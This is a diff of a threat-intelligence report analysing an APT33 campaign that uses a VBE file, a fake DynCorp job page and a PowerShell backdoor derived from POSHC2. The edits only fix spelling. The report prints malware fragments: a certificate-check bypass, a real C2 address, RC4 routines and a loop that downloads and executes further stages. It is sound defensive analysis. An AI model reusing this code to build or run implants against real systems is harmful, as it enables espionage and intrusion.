@@ -12,12 +12,12 @@
   + [Ressources](#Ressources)
 
 <h2>Malware analysis <a name="Malware-analysis"></a></h2>
-<h6>The initial sample reported as VBE file by APT33. The fact to use VBScript Encoded Script File as vector have been firstly observed on the Muddywater group and after APT33, this TTPs is currently used  by the both Iranian groups in theirs operations.
-Firstly, we can confirm that an VBE file by the magic number sequence ```23 40 7E (in ASCII "#@~")```.</h6>
+<h6>The initial sample reported as VBE file by APT33. The fact to use VBScript Encoded Script File as vector have been firstly observed on the Muddywater group and after APT33, this TTPs is currently used by the both Iranian groups in theirs operations.
+Firstly, we can confirm that is a VBE file by the magic number sequence ```23 40 7E (in ASCII "#@~")```.</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/VBE%20-1.png">
 </p>
-<h6> Once decoded, we can observed the first layer of the powershell script, this use a common series of techniques for obfuscate the payload. This decode in base 64 a stream of a zip file, extract it in the memory and execute the code still in memory.</h6>
+<h6>Once decoded, we can observed the first layer of the PowerShell script, this uses a common series of techniques for obfuscating the payload. This decode in base 64 a stream of a zip file, extract it in the memory and execute the code still in memory.</h6>
 
 ``` powershell
 
@@ -25,7 +25,7 @@ powershell /w 1 IEX(New-Object IO.StreamReader((New-Object System.IO.Compression
 
 ```
 
-<h6>On the second layer, we can see multiple bloc of fuctions and variables. The first bloc content the parameters like IP, the validation for check the validity of the certificate and URL</h6>
+<h6>On the second layer, we can see multiple blocs of functions and variables. The first bloc content the parameters like IP, the validation for check the validity of the certificate and URL.</h6>
 
 ``` powershell 
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
@@ -33,7 +33,7 @@ $IP="https://213.227.155.25:443"
 $URL="https://213.227.155.25:443/babel-polyfill/6.3.14/"
 ```
 
-<h6>The next bloc content the functions for decode and encode in RC4. This is used for obfuscated the strings and communcations between the client and the server C2</h6>
+<h6>The next bloc content the functions for decode and encode in RC4. This is used for obfuscating the strings and the communications between the client and the server C2.</h6>
 
 ``` powershell 
 function CAM ($key,$IV)
@@ -75,7 +75,7 @@ function DEC ($key,$enc)
 }
 ```
 
-<h6>The next function is used for check the local time and trigged  a kill switch if this after the 12th December 2019. Once this check this setup the proxy settings if the version of the CLR is at least over the second version.</h6>
+<h6>The next function is used for check the local time and trigged a kill switch if this after 12th December 2019. Once this check this setup the proxy settings if the version of the CLR is at least over the second version.</h6>
 
 ``` powershell 
 function Get-Webclient ($Cookie) 
@@ -121,7 +121,7 @@ function Get-Webclient ($Cookie)
     $webclient 
 }
 ```
-<h6> The main function is called 3 times for download the next stage of the payload, decode with the secret of the RC4 algorithm and execute it. By the same time send informations of the victim to C2 as new session created.</h6>
+<h6>The main function is called three times for download the next stage of the payload, decode with the secret of the RC4 algorithm and execute it. By the same time send informations of the victim to C2 as new session created.</h6>
 
 ```powershell
 function main 
@@ -149,25 +149,25 @@ try {main} catch {}
 Start-Sleep 600
 try {main} catch {}
 ```
-<h6>The first time give the fake job to the victim, if the victim is interesting for APT33, this deploy the next stage else perform an invalid content who are catched and don't show something on the screen.</h6>
+<h6>The first time give the fake job to the victim, if the victim is interesting for APT33, this deploys the next stage else perform an invalid content who are caught and don't show anything on the screen.</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Site-2.png">
 </p>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Site-1.png">
 </p>
-<h6> The fake page redirect by submit buttom to a real job proposed by the same company DynCorp International. An american global service provider. Started as an aviation company, the company also provides flight operations support, training and mentoring, international development, intelligence training and support, contingency operations, security, and operations and maintenance of land vehicles.</h6>
+<h6>The fake page redirects by to submit bottom to a real job proposed by the same company DynCorp International. An American global service provider. Started as an aviation company, the company also provides flight operations support, training and mentoring, international development, intelligence training and support, contingency operations, security, and operations and maintenance of land vehicles.</h6>
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
-<h6> The second layer of the powershell backdoor is edited from an open source framework POSHC2 (cf. ressource link). Compared to Muddywater, APT33 have gone to the open source framework probably for financial resson and better payload abilities. </h6><h6>According to Symantec analysis this used the same TTPs with POSHC2 payload sice the last months. </h6>
+<h6>The second layer of the PowerShell backdoor is edited from an open-source framework POSHC2 (cf. link). Compared to Muddywater, APT33 have gone to the open-source framework probably for financial reason and better payload abilities. </h6><h6>According to Symantec analysis this used the same TTPs with POSHC2 payload since the last months.</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Info-2.PNG">
 </p>
 
-<h6> APT33 have since get an watch out for new open-source tools that can be used in their operations. By example, APT33 have been used in the new exploit on winrar archive found by Checkpoint for the campagn of February 2019.</h6>
+<h6>APT33 has had since get a watch out for new open-source tools that can be used in their operations. By an example, APT33 have been used in the new exploit on winrar archive found by Checkpoint for the campaign of February 2019.</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Info-1.PNG">
 </p>
-<h6>One year ago the same TTPs have begin to show to use fake page who redirect on the offers jobs from the real portal carrers of the companies. Aramco Services Company have been usurped for APT33 the only difference is POSHC2 have remplace the refective loader of the dll.</h6>
+<h6>One year ago the same TTPs had begun to show to use the fake page who redirect on the offers jobs from the real portal careers of the companies. Aramco Services Company have been usurped for APT33 the only difference is POSHC2 have replace the refective loader of the dll.</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/old-1.PNG">
 </p>
@@ -177,7 +177,7 @@ try {main} catch {}
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/job.png">
 </p>
-<h6>This can be give an idea of the original way used by APT33, that probably an HTA file used on a spear-phishing compagn.</h6>
+<h6>This can give an idea of the original way used by APT33, that probably an HTA file used on a spear-phishing campaign.</h6>
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
 <h6>The process graph resume cyber kill chains used by the attacker :</h6>
 <p align="center">
@@ -218,7 +218,7 @@ try {main} catch {}
 * [JobDescription.vbe](https://app.any.run/tasks/c4630121-3967-451f-b238-7624d07f7319)
 * [AramCoJobs.hta](https://app.any.run/tasks/124bd8cf-4a93-4e39-94c2-fa7790706260)
 
-<h6> Ressources : </h6><a name="Ressources"></a>
+<h6> Resources : </h6><a name="Ressources"></a>
 
 * [Lab52 analysis on the APT33 group](https://lab52.io/blog/geopolitical-strategy-of-iran-and-the-cyberattacks-of-apt33/)
 * [Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
